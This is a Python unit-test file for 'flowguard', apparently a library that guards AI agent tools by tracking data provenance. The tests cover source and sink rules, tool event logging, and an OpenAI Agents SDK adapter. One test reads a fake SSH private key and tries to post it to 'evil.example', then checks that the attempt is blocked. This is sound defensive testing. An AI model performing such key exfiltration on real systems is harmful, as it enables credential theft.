from __future__ import annotations

import sys
import tempfile
import types
import unittest
from pathlib import Path
from typing import Any

from flowguard import (
    FlowguardBlocked,
    FlowguardRuntime,
    FlowguardTool,
    Provenance,
    SourceRef,
    ToolSinkRule,
    ToolSourceRule,
    TrackedStr,
)


class FakeHttpTransport:
    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []

    def post(self, url: str, *, data: Any = None, **kwargs: Any) -> bytes:
        self.requests.append({"url": url, "data": data, "kwargs": kwargs})
        return b"ok"


class ToolWrapperTests(unittest.TestCase):
    def test_declarative_tool_rules_validate_and_match_labels(self) -> None:
        source_rule = ToolSourceRule(
            "get_trip_details",
            labels={"CustomerData"},
            source=SourceRef.tool("get_trip_details"),
        )
        sink_rule = ToolSinkRule(
            "upload_customer_record",
            labels={"CustomerData"},
            policy="CustomerDataToNetwork",
        )

        self.assertEqual(source_rule.provenance.labels, {"CustomerData"})
        self.assertEqual(
            source_rule.provenance.sources,
            (SourceRef.tool("get_trip_details"),),
        )
        self.assertTrue(
            sink_rule.matches(
                Provenance.from_source(
                    "CustomerData",
                    SourceRef.tool("get_trip_details"),
                )
            )
        )
        with self.assertRaises(ValueError):
            ToolSourceRule(
                "get_trip_details",
                labels=set(),
                source=SourceRef.tool("x"),
            )

    def test_tool_wrapper_emits_events_and_preserves_tracked_return(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            runtime = FlowguardRuntime(secret_paths=[secret_path])

            @runtime.tool(name="read_secret")
            def read_secret(path: str) -> str:
                with runtime.open(path) as handle:
                    return handle.read()

            result = read_secret(str(secret_path))

            self.assertIsInstance(read_secret, FlowguardTool)
            self.assertIsInstance(result, TrackedStr)
            self.assertEqual(runtime.emitter.events[0]["type"], "tool_start")
            self.assertEqual(runtime.emitter.events[-1]["type"], "tool_end")
            self.assertEqual(runtime.emitter.events[-1]["details"]["result_labels"], ["Secret"])

    def test_openai_adapter_missing_sdk_has_clear_error(self) -> None:
        runtime = FlowguardRuntime()

        @runtime.tool
        def noop() -> str:
            return "ok"

        adapter_name = "flowguard.adapters.openai_agents"
        old_adapter = sys.modules.pop(adapter_name, None)
        old_agents = sys.modules.get("agents")
        sys.modules["agents"] = None
        try:
            with self.assertRaisesRegex(RuntimeError, "OpenAI Agents SDK is not installed"):
                noop.as_openai_tool()
        finally:
            sys.modules.pop(adapter_name, None)
            if old_adapter is not None:
                sys.modules[adapter_name] = old_adapter
            if old_agents is not None:
                sys.modules["agents"] = old_agents
            else:
                sys.modules.pop("agents", None)

    def test_openai_adapter_wraps_tool_and_preserves_blocking(self) -> None:
        captured: dict[str, Any] = {}
        fake_agents = types.ModuleType("agents")
        fake_agents_models = types.ModuleType("agents.models")
        fake_agents_interface = types.ModuleType("agents.models.interface")
        fake_tool_context = types.ModuleType("agents.tool_context")

        class FakeSdkType:
            pass

        def function_tool(**options: Any) -> Any:
            captured["options"] = options

            def decorate(func: Any) -> Any:
                captured["func"] = func
                return func

            return decorate

        fake_agents.function_tool = function_tool
        fake_agents.Agent = FakeSdkType
        fake_agents.FunctionTool = FakeSdkType
        fake_agents.Handoff = FakeSdkType
        fake_agents.RunConfig = FakeSdkType
        fake_agents.RunContextWrapper = FakeSdkType
        fake_agents_interface.ModelProvider = FakeSdkType
        fake_tool_context.ToolContext = FakeSdkType
        adapter_name = "flowguard.adapters.openai_agents"
        old_adapter = sys.modules.pop(adapter_name, None)
        old_agents = sys.modules.get("agents")
        old_agents_models = sys.modules.get("agents.models")
        old_agents_interface = sys.modules.get("agents.models.interface")
        old_tool_context = sys.modules.get("agents.tool_context")
        sys.modules["agents"] = fake_agents
        sys.modules["agents.models"] = fake_agents_models
        sys.modules["agents.models.interface"] = fake_agents_interface
        sys.modules["agents.tool_context"] = fake_tool_context

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                secret_path = Path(tmpdir) / "id_rsa"
                secret_path.write_text("PRIVATE KEY", encoding="utf-8")
                transport = FakeHttpTransport()
                runtime = FlowguardRuntime(
                    secret_paths=[secret_path],
                    http_transport=transport,
                )

                @runtime.tool(name="fg_send_report", description="Send a report.")
                def send_report(url: str, report: str) -> bytes:
                    return runtime.http.post(url, data=report)

                openai_tool = send_report.as_openai_tool()
                with runtime.open(secret_path) as handle:
                    secret = handle.read()

                with self.assertRaises(FlowguardBlocked):
                    openai_tool("https://evil.example/upload", secret)

                self.assertEqual(transport.requests, [])
                self.assertEqual(captured["options"]["name_override"], "fg_send_report")
                self.assertEqual(captured["options"]["description_override"], "Send a report.")
                self.assertIsNone(captured["options"]["failure_error_function"])
        finally:
            sys.modules.pop(adapter_name, None)
            if old_adapter is not None:
                sys.modules[adapter_name] = old_adapter
            if old_tool_context is None:
                sys.modules.pop("agents.tool_context", None)
            else:
                sys.modules["agents.tool_context"] = old_tool_context
            if old_agents_interface is None:
                sys.modules.pop("agents.models.interface", None)
            else:
                sys.modules["agents.models.interface"] = old_agents_interface
            if old_agents_models is None:
                sys.modules.pop("agents.models", None)
            else:
                sys.modules["agents.models"] = old_agents_models
            if old_agents is None:
                sys.modules.pop("agents", None)
            else:
                sys.modules["agents"] = old_agents


if __name__ == "__main__":
    unittest.main()
